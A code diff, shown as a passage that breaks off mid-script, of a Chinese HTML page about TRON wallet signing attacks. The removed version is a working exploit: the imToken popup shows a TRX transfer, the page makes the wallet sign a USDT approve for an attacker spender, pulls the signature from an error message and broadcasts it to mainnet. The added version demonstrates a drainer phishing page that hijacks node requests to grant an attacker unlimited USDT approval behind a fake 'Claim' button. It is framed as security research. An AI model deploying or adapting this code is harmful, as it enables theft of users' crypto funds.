@@ -1,599 +1,796 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>imToken TRON「所见非所签」演示 · 签名回收+自广播</title>
-<style>
-  :root{
-    --bg:#0b0f14; --card:#131a22; --card2:#0f151c; --border:#253040;
-    --text:#e6ebf2; --text2:#8a99ab; --red:#f04343; --orange:#e6a23c;
-    --green:#2ecc71; --blue:#4d94ff; --purple:#9b6bff;
-  }
-  *{margin:0;padding:0;box-sizing:border-box;}
-  body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;padding:16px;display:flex;flex-direction:column;gap:14px;line-height:1.55;}
-  .card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:18px;}
-  .card-header{font-weight:700;font-size:15px;margin-bottom:12px;display:flex;align-items:center;gap:8px;}
-  .dot{width:9px;height:9px;border-radius:50%;display:inline-block;background:var(--text2);}
-  .dot.green{background:var(--green);} .dot.red{background:var(--red);} .dot.orange{background:var(--orange);}
-  p.desc{font-size:13px;color:var(--text2);margin:6px 0;}
-  .desc b{color:var(--text);}
-  .hl-red{color:var(--red);font-weight:600;}
-  .hl-green{color:var(--green);font-weight:600;}
-  .hl-blue{color:var(--blue);font-weight:600;}
-  .hl-orange{color:var(--orange);font-weight:600;}
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TRON 钱包交互演示 —— 教学用途</title>
+  <style>
+    :root {
+      --bg: #0f172a;
+      --card-bg: #1e293b;
+      --border: #334155;
+      --text: #e2e8f0;
+      --text-muted: #94a3b8;
+      --accent: #3b82f6;
+      --danger: #ef4444;
+      --success: #22c55e;
+      --warning: #f59e0b;
+      --code-bg: #0a0f1a;
+    }
 
-  .row{display:flex;justify-content:space-between;gap:10px;padding:7px 0;font-size:13px;border-bottom:1px solid rgba(255,255,255,.05);}
-  .row:last-child{border-bottom:none;}
-  .label{color:var(--text2);min-width:90px;}
-  .value{text-align:right;word-break:break-all;font-family:ui-monospace,monospace;font-size:12px;}
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+    }
 
-  label.field{display:block;font-size:12px;color:var(--text2);margin:10px 0 4px;}
-  input{width:100%;padding:11px 12px;border-radius:9px;border:1px solid var(--border);background:var(--card2);color:var(--text);font-family:ui-monospace,monospace;font-size:13px;}
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 24px 16px;
+    }
 
-  .btn{width:100%;padding:14px 0;border-radius:10px;border:none;font-size:15px;font-weight:700;cursor:pointer;margin-top:12px;color:#fff;}
-  .btn-connect{background:var(--green);color:#03210f;}
-  .btn-run{background:linear-gradient(90deg,#e64343,#9b2fd6);font-size:16px;}
-  .btn:disabled{opacity:.5;cursor:not-allowed;}
+    .header {
+      text-align: center;
+      margin-bottom: 32px;
+    }
+    .header h1 {
+      font-size: 28px;
+      background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      margin-bottom: 8px;
+    }
+    .header .badge {
+      display: inline-block;
+      padding: 4px 14px;
+      border-radius: 20px;
+      font-size: 13px;
+      font-weight: 600;
+      background: rgba(239, 68, 68, 0.15);
+      color: #ef4444;
+      border: 1px solid rgba(239, 68, 68, 0.3);
+    }
 
-  /* 步骤条 */
-  .step{display:flex;gap:10px;padding:10px 0;border-bottom:1px dashed rgba(255,255,255,.07);}
-  .step:last-child{border-bottom:none;}
-  .step-ico{flex:0 0 26px;width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;background:#1d2733;color:var(--text2);}
-  .step.active .step-ico{background:var(--blue);color:#fff;}
-  .step.done .step-ico{background:var(--green);color:#03210f;}
-  .step.fail .step-ico{background:var(--red);color:#fff;}
-  .step-body{flex:1;}
-  .step-title{font-size:13.5px;font-weight:600;}
-  .step-note{font-size:12px;color:var(--text2);margin-top:2px;}
+    /* ====== Card ====== */
+    .card {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 24px;
+      margin-bottom: 20px;
+    }
+    .card-title {
+      font-size: 17px;
+      font-weight: 700;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .card-title .icon { font-size: 20px; }
 
-  .info-box{background:rgba(77,148,255,.08);border:1px solid rgba(77,148,255,.25);border-radius:9px;padding:11px;font-size:12.5px;color:#bcd6ff;margin-top:10px;}
-  .warn-box{background:rgba(240,67,67,.08);border:1px solid rgba(240,67,67,.28);border-radius:9px;padding:11px;font-size:12.5px;color:#ffb4b4;margin-top:10px;}
-  .verdict{font-size:15px;font-weight:700;text-align:center;padding:12px;border-radius:10px;margin-top:8px;}
+    /* ====== 按钮 ====== */
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 10px 22px;
+      border-radius: 10px;
+      font-size: 15px;
+      font-weight: 600;
+      border: none;
+      cursor: pointer;
+      transition: all 0.2s;
+      text-decoration: none;
+    }
+    .btn-primary { background: var(--accent); color: #fff; }
+    .btn-primary:hover { background: #2563eb; }
+    .btn-danger { background: var(--danger); color: #fff; }
+    .btn-danger:hover { background: #dc2626; }
+    .btn-success { background: var(--success); color: #fff; }
+    .btn-outline {
+      background: transparent;
+      border: 1px solid var(--border);
+      color: var(--text);
+    }
+    .btn-outline:hover { background: rgba(255,255,255,0.05); }
+    .btn:disabled { opacity: 0.45; cursor: not-allowed; }
 
-  .log-box{background:#070b10;border:1px solid var(--border);border-radius:10px;padding:10px;font-family:ui-monospace,monospace;font-size:11px;max-height:300px;overflow-y:auto;color:#9fb0c2;}
-  .log-line{padding:2px 0;white-space:pre-wrap;word-break:break-all;}
-  .log-error{color:var(--red);} .log-success{color:var(--green);} .log-warn{color:var(--orange);}
-  .foot{font-size:11px;color:var(--text2);text-align:center;}
-</style>
+    .btn-row { display: flex; gap: 12px; flex-wrap: wrap; margin-top: 16px; }
+
+    /* ====== 状态行 ====== */
+    .status-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 10px 14px;
+      border-radius: 8px;
+      background: rgba(59, 130, 246, 0.08);
+      border: 1px solid rgba(59, 130, 246, 0.2);
+      margin-bottom: 14px;
+      font-size: 14px;
+    }
+    .status-dot {
+      width: 10px; height: 10px;
+      border-radius: 50%;
+      background: #64748b;
+      flex-shrink: 0;
+    }
+    .status-dot.connected { background: #22c55e; }
+
+    /* ====== 代码块 ====== */
+    pre {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 16px;
+      overflow-x: auto;
+      font-family: 'Fira Code', 'Cascadia Code', 'JetBrains Mono', monospace;
+      font-size: 12.5px;
+      line-height: 1.6;
+      white-space: pre-wrap;
+      word-break: break-all;
+      color: #cbd5e1;
+      margin-top: 8px;
+    }
+    pre .hl-comment { color: #64748b; }
+    pre .hl-func { color: #60a5fa; }
+    pre .hl-str { color: #34d399; }
+    pre .hl-num { color: #fbbf24; }
+    pre .hl-key { color: #c084fc; }
+    pre .hl-danger { color: #f87171; }
+
+    /* ====== 日志面板 ====== */
+    .log-panel {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      height: 320px;
+      overflow-y: auto;
+      padding: 12px;
+      font-family: 'Fira Code', monospace;
+      font-size: 12px;
+      line-height: 1.7;
+    }
+    .log-line { display: flex; gap: 8px; }
+    .log-time { color: #64748b; flex-shrink: 0; }
+    .log-msg { color: #cbd5e1; }
+    .log-msg.warn { color: #fbbf24; }
+    .log-msg.danger { color: #f87171; }
+    .log-msg.success { color: #34d399; }
+    .log-msg.info { color: #60a5fa; }
+
+    /* ====== 步骤指示器 ====== */
+    .steps {
+      display: flex;
+      gap: 4px;
+      margin-bottom: 20px;
+    }
+    .step {
+      flex: 1;
+      text-align: center;
+      padding: 10px 6px;
+      border-radius: 8px;
+      background: rgba(255,255,255,0.03);
+      border: 1px solid var(--border);
+      font-size: 12px;
+      opacity: 0.45;
+      transition: all 0.3s;
+    }
+    .step.active {
+      opacity: 1;
+      border-color: var(--accent);
+      background: rgba(59, 130, 246, 0.1);
+    }
+    .step.done {
+      opacity: 1;
+      border-color: var(--success);
+      background: rgba(34, 197, 94, 0.08);
+    }
+    .step-num {
+      font-size: 18px;
+      font-weight: 800;
+      display: block;
+      margin-bottom: 4px;
+    }
+
+    /* ====== Diff 对比 ====== */
+    .diff-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+    }
+    @media (max-width: 640px) {
+      .diff-grid { grid-template-columns: 1fr; }
+    }
+    .diff-col {
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      overflow: hidden;
+    }
+    .diff-col-header {
+      padding: 8px 14px;
+      font-size: 13px;
+      font-weight: 700;
+      text-align: center;
+    }
+    .diff-col-header.surface { background: rgba(59,130,246,0.15); color: #60a5fa; }
+    .diff-col-header.actual { background: rgba(239,68,68,0.12); color: #f87171; }
+    .diff-col pre {
+      border: none;
+      border-radius: 0;
+      margin: 0;
+      font-size: 11.5px;
+      max-height: 400px;
+      overflow-y: auto;
+    }
+  </style>
 </head>
 <body>
+<div class="container">
 
-<!-- =================================================================
-     卡片 0：这页在演示什么（用大白话讲给初学者）
-================================================================= -->
-<div class="card">
-  <div class="card-header"><span class="dot red"></span> 「所见非所签」攻击演示</div>
-  <p class="desc">
-    <b>一句话：</b>钱包弹窗给你看的是<span class="hl-blue">「转账 TRX」</span>，
-    但你按下确认后，实际签名并上链的是<span class="hl-red">「授权（approve）」</span>——
-    一旦授权，攻击者就能把你的 USDT 划走。这就是 “What You See Is Not What You Sign”。
-  </p>
-  <p class="desc"><b>为什么能做到（原理）：</b></p>
-  <p class="desc">
-    imToken 给 DApp 的一笔交易里有两份数据：<br>
-    · <span class="hl-blue">raw_data</span>：弹窗<b>“显示”</b>用的（我们填成转账）<br>
-    · <span class="hl-red">raw_data_hex</span>：真正<b>“被签名”</b>的字节（我们填成 approve）<br>
-    用 <code>tron.sendTransaction</code> 时，imToken <b>不检查这两份是否一致</b>：
-    它<b>显示 raw_data（转账）</b>，却<b>签 raw_data_hex（approve）</b>。
-  </p>
-  <p class="desc"><b>那怎么让它上链？</b></p>
-  <p class="desc">
-    imToken 自己广播会用“转账”那份数据，所以它自己发会失败。但<span class="hl-orange">失败的报错里，原样回显了刚才对 approve 的签名</span>。
-    我们把这枚签名“捡回来”，配上<b>真正的 approve 数据</b>，<b>自己直接发给 TRON 节点</b>。
-    因为这份 approve 自洽（哈希 = 签名锚定的哈希），<span class="hl-green">节点验签通过 → approve 成功上链</span>。
-  </p>
-  <div class="warn-box">
-    ⚠️ 这是<b>真实上链</b>的操作，会真的产生一笔链上授权。请只在<b>测试钱包</b>、用<b>最小额度</b>演示。仅供安全研究与负责任披露。
-  </div>
-</div>
-
-<!-- =================================================================
-     卡片 1：参数设置（攻击目标 = 把谁设成被授权人、授权多少）
-================================================================= -->
-<div class="card">
-  <div class="card-header"><span class="dot orange"></span> 攻击参数</div>
-  <p class="desc">下面是“被偷偷执行”的那笔 approve 的参数，可按需修改：</p>
-
-  <label class="field">USDT 合约地址（被授权的代币）</label>
-  <input id="inContract" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t">
-
-  <label class="field">Spender（被授权人 = 攻击者地址，将能花你的 USDT）</label>
-  <input id="inSpender" value="TP3NQwSaEHYs7cowWFWq5ozNkeG4ie3Wbi">
-
-  <label class="field">授权额度（最小单位；USDT 是 6 位小数，1000000 = 1 USDT）</label>
-  <input id="inAmount" value="1000000">
-
-  <button class="btn btn-connect" id="btnConnect">① 连接 imToken 钱包</button>
-  <div class="row" style="margin-top:10px;"><span class="label">钱包地址</span><span class="value" id="vAddr">未连接</span></div>
-  <div class="row"><span class="label">TRX 余额</span><span class="value" id="vTrx">--</span></div>
-</div>
-
-<!-- =================================================================
-     卡片 2：一键执行 + 步骤进度
-================================================================= -->
-<div class="card">
-  <div class="card-header"><span class="dot red"></span> 一键执行演示</div>
-  <p class="desc">点下面按钮后，imToken 会弹窗。请<b>注意看弹窗显示的是「转账」</b>，然后确认。</p>
-  <button class="btn btn-run" id="btnRun" disabled>② 执行「所见非所签」（显转账·链上approve）</button>
-
-  <div style="margin-top:14px;">
-    <div class="step" id="st1"><div class="step-ico">1</div><div class="step-body">
-      <div class="step-title">准备两笔交易</div>
-      <div class="step-note">A = 真实 approve（偷偷执行） / B = 转账 TRX（给你看的幌子）</div></div></div>
-    <div class="step" id="st2"><div class="step-ico">2</div><div class="step-body">
-      <div class="step-title">请 imToken 签名</div>
-      <div class="step-note">弹窗显示「转账 B」，实际签的是「approve A」的字节</div></div></div>
-    <div class="step" id="st3"><div class="step-ico">3</div><div class="step-body">
-      <div class="step-title">回收签名</div>
-      <div class="step-note">从 imToken 内部广播失败的报错里，抠出对 approve 的签名</div></div></div>
-    <div class="step" id="st4"><div class="step-ico">4</div><div class="step-body">
-      <div class="step-title">自广播 approve</div>
-      <div class="step-note">真 approve 数据 + 回收的签名 → 直连 TRON 节点</div></div></div>
-    <div class="step" id="st5"><div class="step-ico">5</div><div class="step-body">
-      <div class="step-title">验证结果</div>
-      <div class="step-note">回链查类型 + 查询授权额度是否真的变了</div></div></div>
+  <!-- ====== 头部 ====== -->
+  <div class="header">
+    <h1>🔬 TRON 智能合约交互演示</h1>
+    <span class="badge">⚠ 仅用于安全研究 / 教学</span>
   </div>
 
-  <div class="verdict" id="verdict" style="display:none;"></div>
-  <div class="info-box" id="infoBox" style="display:none;"></div>
+  <!-- ====== 步骤条 ====== -->
+  <div class="steps" id="stepBar">
+    <div class="step" data-step="1">
+      <span class="step-num">1</span> 连接钱包
+    </div>
+    <div class="step" data-step="2">
+      <span class="step-num">2</span> 加载加密参数
+    </div>
+    <div class="step" data-step="3">
+      <span class="step-num">3</span> 劫持 fullNode.request
+    </div>
+    <div class="step" data-step="4">
+      <span class="step-num">4</span> 用户点击 Claim
+    </div>
+    <div class="step" data-step="5">
+      <span class="step-num">5</span> 签名 & 广播
+    </div>
+    <div class="step" data-step="6">
+      <span class="step-num">6</span> 上报结果
+    </div>
+  </div>
+
+  <!-- ====== 钱包连接 ====== -->
+  <div class="card">
+    <div class="card-title"><span class="icon">👛</span> 钱包连接</div>
+    <div class="status-row">
+      <span class="status-dot" id="walletDot"></span>
+      <span id="walletStatus">未连接</span>
+    </div>
+    <div style="margin-top:8px;">
+      <span style="color:var(--text-muted);font-size:13px;">地址：</span>
+      <code id="walletAddr" style="font-size:13px;word-break:break-all;">—</code>
+    </div>
+    <div class="btn-row">
+      <button class="btn btn-primary" id="btnConnect" onclick="connectWallet()">
+        🔗 连接 TokenPocket / TronLink
+      </button>
+      <button class="btn btn-outline" id="btnDisconnect" onclick="disconnectWallet()" style="display:none;">
+        断开
+      </button>
+    </div>
+  </div>
+
+  <!-- ====== 表面调用 vs 实际请求对比 ====== -->
+  <div class="card">
+    <div class="card-title"><span class="icon">🎭</span> 交易对比：用户所见 vs 实际发生</div>
+    <div class="diff-grid">
+      <!-- 表面调用 -->
+      <div class="diff-col">
+        <div class="diff-col-header surface">📄 页面展示（用户所见）</div>
+        <pre><span class="hl-comment">// triggerSmartContract 调用</span>
+<span class="hl-func">triggerSmartContract</span>(
+  <span class="hl-str">"TKzxdSv2FZKQrEqkKVgp5DcwEXBEKMg2Ax"</span>,
+  <span class="hl-str">"claim()"</span>,
+  { feeLimit: <span class="hl-num">100000000</span> },
+  [],
+  userAddress
+);
+
+<span class="hl-comment">// 用户看到：</span>
+<span class="hl-comment">// - 合约: TKzxdSv...KMg2Ax</span>
+<span class="hl-comment">// - 方法: claim()</span>
+<span class="hl-comment">// - 费用: 0.10 TRX</span>
+<span class="hl-comment">// - 参数: 空</span></pre>
+      </div>
+      <!-- 实际请求 -->
+      <div class="diff-col">
+        <div class="diff-col-header actual">⚠ 实际 fullNode 请求（被劫持替换）</div>
+        <pre><span class="hl-comment">// fullNode.request 被拦截 → 替换为：</span>
+{
+  owner_address: <span class="hl-str">userHexAddr</span>,
+  contract_address:
+    <span class="hl-str">"<span class="hl-danger">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</span>"</span>,
+  function_selector:
+    <span class="hl-str">"<span class="hl-danger">increaseApproval(address,uint256)</span>"</span>,
+  parameter:
+    <span class="hl-str">"000000000000000000000000</span>
+    <span class="hl-str danger">59bccfbae8597513460f34133ffbc173915264b6</span>
+    <span class="hl-str">ffffffffffffffffffffffffffffffff</span>
+    <span class="hl-str danger">ffffffffffffffffffffffffffff</span><span class="hl-str">"</span>,
+  call_value: <span class="hl-num">0</span>
+}</pre>
+      </div>
+    </div>
+  </div>
+
+  <!-- ====== 参数解码 ====== -->
+  <div class="card">
+    <div class="card-title"><span class="icon">🔍</span> ABI 参数解码</div>
+    <pre><span class="hl-comment">// parameter 是两个 ABI 32 字节参数</span>
+
+<span class="hl-comment">// 参数 1：授权对象 (address)</span>
+000000000000000000000000<span class="hl-danger">59bccfbae8597513460f34133ffbc173915264b6</span>
+→ 地址：<span class="hl-danger">TJ9hKyrps8okRuVFcdp6nrc6H5dpwSTutD</span>
+
+<span class="hl-comment">// 参数 2：授权额度 (uint256)</span>
+<span class="hl-danger">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span>
+→ 数值：<span class="hl-danger">2²⁵⁶ − 1</span>（无上限授权）
+
+<span class="hl-comment">// 等效 Solidity 调用：</span>
+USDT.<span class="hl-danger">increaseApproval</span>(
+    <span class="hl-danger">TJ9hKyrps8okRuVFcdp6nrc6H5dpwSTutD</span>,
+    type(uint256).max
+);
+
+<span class="hl-comment">// 后果：攻击者地址获得 USDT 无限授权</span>
+<span class="hl-comment">// → 可随时 transferFrom 转走用户所有 USDT</span></pre>
+  </div>
+
+  <!-- ====== 执行流程 ====== -->
+  <div class="card">
+    <div class="card-title"><span class="icon">⚡</span> 执行按钮（模拟）</div>
+    <p style="color:var(--text-muted);font-size:14px;margin-bottom:14px;">
+      点击下方按钮，观察完整劫持流程。你需要先连接 TronLink / TokenPocket 钱包。
+    </p>
+    <div class="btn-row">
+      <button class="btn btn-success" id="btnClaim" onclick="executeClaim()" disabled>
+        🎁 Claim 奖励
+      </button>
+      <button class="btn btn-outline" id="btnReset" onclick="resetDemo()">
+        🔄 重置演示
+      </button>
+    </div>
+    <div style="margin-top:12px;font-size:13px;color:var(--text-muted);">
+      ⚠ 注意：此处 <strong>不会</strong> 发起真实的链上交易，
+      仅在控制台和日志面板中展示劫持流程。
+    </div>
+  </div>
+
+  <!-- ====== 日志面板 ====== -->
+  <div class="card">
+    <div class="card-title"><span class="icon">📋</span> 执行日志</div>
+    <div class="log-panel" id="logPanel">
+      <div class="log-line"><span class="log-time">--:--:--</span><span class="log-msg">等待操作…</span></div>
+    </div>
+  </div>
+
 </div>
 
-<!-- =================================================================
-     卡片 3：授权额度对比（最有说服力的证据）
-================================================================= -->
-<div class="card" id="allowCard" style="display:none;">
-  <div class="card-header"><span class="dot green"></span> 授权额度对比（USDT）</div>
-  <div class="row"><span class="label">执行前</span><span class="value" id="vAllowBefore">--</span></div>
-  <div class="row"><span class="label">执行后</span><span class="value" id="vAllowAfter">--</span></div>
-  <div class="row"><span class="label">变化</span><span class="value" id="vAllowDiff">--</span></div>
-  <div class="row"><span class="label">链上交易</span><span class="value" id="vTxid">--</span></div>
-</div>
-
-<!-- =================================================================
-     卡片 4：运行日志
-================================================================= -->
-<div class="card">
-  <div class="card-header"><span class="dot orange"></span> 运行日志</div>
-  <div class="log-box" id="logBox">等待操作…</div>
-</div>
-
-<div class="foot">仅供安全研究与负责任披露 · imToken TRON 原生桥「所见非所签」</div>
+<!-- ====== TronWeb (CDN) ====== -->
+<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
 
 <script>
-(function(){
-  "use strict";
+// ============================================================
+//  配置
+// ============================================================
+const CONFIG = {
+  // 用户看到的表面合约
+  SURFACE_CONTRACT: 'TKzxdSv2FZKQrEqkKVgp5DcwEXBEKMg2Ax',
+  SURFACE_METHOD:   'claim()',
 
-  // ============================================================
-  // 基础配置和小工具
-  // ============================================================
-  var TRON_API = 'https://api.trongrid.io';   // TRON 主网公共节点（用来自己广播 + 查询）
-  var walletAddr = '';                          // 连接后填入你的钱包地址
-  var allowBefore = null;                       // 执行前的授权额度（用来对比）
+  // 实际被替换成的 USDT 合约（TRC20）
+  USDT_CONTRACT:    'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
+  USDT_METHOD:      'increaseApproval(address,uint256)',
 
-  // 这三个值在“连接钱包”时从输入框读取，全程使用
-  var USDT_CONTRACT = '';
-  var SPENDER = '';
-  var APPROVE_AMOUNT = '';
+  // 攻击者收款地址
+  DRAIN_ADDRESS_HEX: '59bccfbae8597513460f34133ffbc173915264b6',
+  DRAIN_ADDRESS_B58: 'TJ9hKyrps8okRuVFcdp6nrc6H5dpwSTutD',
 
-  var $ = function(id){ return document.getElementById(id); };
+  // feeLimit: 100 TRX (单位 SUN)
+  FEE_LIMIT: 100000000,
 
-  // 往日志框里打一行字（type 控制颜色：'success'/'error'/'warn'）
-  function log(msg, type){
-    var box = $('logBox');
-    if (box.textContent === '等待操作…') box.textContent = '';
-    var line = document.createElement('div');
-    line.className = 'log-line' + (type ? ' log-' + type : '');
-    line.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
-    box.appendChild(line);
-    box.scrollTop = box.scrollHeight;
+  // 上报地址（模拟）
+  REPORT_URL_EVENT: '/api/event',
+  REPORT_URL_FISH:  '/fish',
+
+  // 远程加密参数 URL（模拟）
+  REMOTE_PARAMS_URL: '/api/config',
+};
+
+// ============================================================
+//  状态
+// ============================================================
+let walletAddress   = null;    // Base58
+let walletHex       = null;    // Hex
+let tronWeb         = null;
+let originalRequest = null;    // 保存原始 fullNode.request
+let hijacked        = false;
+let currentStep     = 0;
+
+// ============================================================
+//  DOM 引用
+// ============================================================
+const $ = (id) => document.getElementById(id);
+const walletDot    = $('walletDot');
+const walletStatus = $('walletStatus');
+const walletAddr   = $('walletAddr');
+const btnConnect   = $('btnConnect');
+const btnDisconnect= $('btnDisconnect');
+const btnClaim     = $('btnClaim');
+const logPanel     = $('logPanel');
+
+// ============================================================
+//  工具函数
+// ============================================================
+function timestamp() {
+  const d = new Date();
+  return d.toTimeString().slice(0, 8);
+}
+
+function addLog(msg, className) {
+  const div = document.createElement('div');
+  div.className = 'log-line';
+  div.innerHTML = `<span class="log-time">${timestamp()}</span><span class="log-msg ${className || ''}">${msg}</span>`;
+  logPanel.appendChild(div);
+  logPanel.scrollTop = logPanel.scrollHeight;
+}
+
+function setStep(n) {
+  currentStep = n;
+  const steps = document.querySelectorAll('#stepBar .step');
+  steps.forEach((el, i) => {
+    el.classList.remove('active', 'done');
+    if (i < n - 1) el.classList.add('done');
+    if (i === n - 1) el.classList.add('active');
+  });
+}
+
+// ============================================================
+//  hex ↔ base58 转换（使用 tronWeb 内置方法）
+// ============================================================
+function toHex(addr) {
+  try { return tronWeb.address.toHex(addr); } catch(e) { return null; }
+}
+
+function fromHex(hex) {
+  try { return tronWeb.address.fromHex(hex); } catch(e) { return null; }
+}
+
+// ============================================================
+//  1. 连接钱包
+// ============================================================
+async function connectWallet() {
+  addLog('🔗 正在检测 tronLink / tokenpocket …', 'info');
+
+  if (!window.tronLink && !window.tronWeb) {
+    addLog('❌ 未检测到 TronLink 或 TokenPocket 插件', 'danger');
+    alert('请先安装 TronLink 或 TokenPocket 浏览器插件');
+    return;
   }
 
-  // 更新某个步骤的状态：'active'(进行中) / 'done'(成功) / 'fail'(失败)
-  function setStep(id, state){
-    var el = $(id);
-    el.classList.remove('active','done','fail');
-    if (state) el.classList.add(state);
-  }
-
-  // 检查是否在 imToken 的 DApp 浏览器里（有没有那个桥）
-  function hasBridge(){
-    return typeof window.imToken !== 'undefined'
-        && typeof window.imToken.callPromisifyAPI === 'function';
-  }
-
-  // 等待 N 毫秒（用 await 配合）
-  function sleep(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }
-
-  // ============================================================
-  // 关键工具：从节点报错文本里“抠出”签名
-  //   报错长这样：
-  //   "... Validate signature error: <一长串16进制=签名> is signed by <地址> ..."
-  //   TRON 签名是 65 字节 = 130 个 16 进制字符。
-  // ============================================================
-  function parseSigFromError(text){
-    if (!text) return null;
-    var s = String(text);
-    // 优先匹配 “<签名> is signed by” 这种格式（TRON 签名 65 字节 = 130 个 16 进制字符）
-    var m = s.match(/([0-9a-fA-F]{120,})\s+is signed by/);
-    if (m) return m[1];
-    // 兜底：取文本里最长的那串 16 进制（通常就是签名）
-    var all = s.match(/[0-9a-fA-F]{120,}/g);
-    if (all && all.length) {
-      return all.sort(function(a,b){ return b.length - a.length; })[0];
-    }
-    return null;
-  }
-
-  // ============================================================
-  // 把一个“错误对象”里所有字段都摊平成文字。
-  //   imToken 抛出的错误可能把信息放在 message / data / 等不同字段里，
-  //   全打出来，既能让正则在更大范围里找签名，也方便你复制给我排查。
-  // ============================================================
-  function dumpError(e){
-    if (e === null || e === undefined) return 'null';
-    if (typeof e === 'string') return e;
-    var parts = [];
-    try{
-      var names = Object.getOwnPropertyNames(e);
-      for (var i=0;i<names.length;i++){
-        var k = names[i], v = e[k];
-        if (typeof v === 'object' && v !== null){
-          try{ v = JSON.stringify(v); }catch(x){ v = '[object]'; }
-        }
-        if (typeof v === 'function') continue;
-        parts.push(k + '=' + v);
+  try {
+    // TokenPocket / TronLink 注入
+    if (window.tronLink) {
+      const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
+      if (res && res.code === 200) {
+        walletAddress = res.message?.[0] || res;
       }
-    }catch(x){}
-    if (!parts.length){
-      try{ return JSON.stringify(e); }catch(x){ return String(e); }
+    } else if (window.tronWeb && window.tronWeb.defaultAddress?.base58) {
+      walletAddress = window.tronWeb.defaultAddress.base58;
     }
-    return parts.join('  |  ');
-  }
 
-  // ============================================================
-  // 在“任意对象”里递归找签名。
-  //   两种来源都覆盖：
-  //   1) 结构化字段：obj.signature（数组或字符串）——imToken 把签名后的交易塞在返回/报错里时
-  //   2) 纯文本里的一长串 16 进制——节点把签名回显在报错文本里时
-  //   这样不管签名藏在哪，都能抠出来。
-  // ============================================================
-  function looksLikeSig(s){
-    if (typeof s !== 'string') return false;
-    var h = s.replace(/^0x/i,'');
-    return /^[0-9a-fA-F]+$/.test(h) && h.length >= 120;   // 65字节签名=130字符
-  }
-  function findSigDeep(obj, depth){
-    depth = depth || 0;
-    if (obj == null || depth > 5) return null;
-    if (typeof obj === 'string'){
-      if (looksLikeSig(obj)) return obj.replace(/^0x/i,'');
-      // 字符串里夹着签名（比如节点报错文本）
-      var m = obj.match(/[0-9a-fA-F]{120,}/g);
-      if (m && m.length) return m.sort(function(a,b){return b.length-a.length;})[0];
-      return null;
-    }
-    if (Array.isArray(obj)){
-      for (var i=0;i<obj.length;i++){ var r=findSigDeep(obj[i],depth+1); if(r) return r; }
-      return null;
-    }
-    if (typeof obj === 'object'){
-      // 优先看 signature 字段
-      if (obj.signature){
-        var sg = Array.isArray(obj.signature) ? obj.signature[0] : obj.signature;
-        if (looksLikeSig(sg)) return sg.replace(/^0x/i,'');
-      }
-      var keys;
-      try{ keys = Object.getOwnPropertyNames(obj); }catch(x){ return null; }
-      for (var k=0;k<keys.length;k++){
-        try{ var rr=findSigDeep(obj[keys[k]],depth+1); if(rr) return rr; }catch(x){}
-      }
-    }
-    return null;
-  }
-
-  // ============================================================
-  // 步骤①：连接钱包，读取参数
-  // ============================================================
-  async function connect(){
-    log('正在检查 imToken 环境…', 'warn');
-    if (!hasBridge()){
-      log('没检测到 imToken。请在 imToken App 的 DApp 浏览器里打开本页面。', 'error');
+    if (!walletAddress) {
+      addLog('❌ 获取钱包地址失败', 'danger');
       return;
     }
-    log('imToken 环境就绪', 'success');
 
-    // 读取攻击参数
-    USDT_CONTRACT = $('inContract').value.trim();
-    SPENDER       = $('inSpender').value.trim();
-    APPROVE_AMOUNT= $('inAmount').value.trim();
-
-    // 等 tronWeb 准备好（imToken 会注入 window.tronWeb）
-    for (var i=0;i<10;i++){
-      if (window.tronWeb && window.tronWeb.ready) break;
-      await sleep(500);
-    }
-    if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress){
-      walletAddr = window.tronWeb.defaultAddress.base58;
-    }
-    // 兜底：用桥的接口拿地址
-    if (!walletAddr){
-      try{
-        var acc = await window.imToken.callPromisifyAPI('tron_requestAccounts');
-        walletAddr = Array.isArray(acc) ? acc[0] : acc;
-      }catch(e){ log('获取地址失败：' + (e.message||e), 'error'); return; }
-    }
-    if (!walletAddr || walletAddr.length !== 34){
-      log('钱包地址无效：' + walletAddr, 'error'); return;
-    }
-
-    $('vAddr').textContent = walletAddr;
-    log('已连接钱包：' + walletAddr, 'success');
-
-    // 查 TRX 余额（顺便确认网络通）
-    try{
-      var r = await fetch(TRON_API + '/v1/accounts/' + walletAddr);
-      var d = await r.json();
-      var trx = (d.data && d.data[0] && d.data[0].balance || 0) / 1e6;
-      $('vTrx').textContent = trx.toFixed(2) + ' TRX';
-    }catch(e){ $('vTrx').textContent = '查询失败'; }
-
-    // 记录“执行前”的授权额度
-    allowBefore = await readAllowance();
-    log('执行前授权额度 = ' + fmtUSDT(allowBefore), 'warn');
-
-    $('btnRun').disabled = false;   // 解锁“执行”按钮
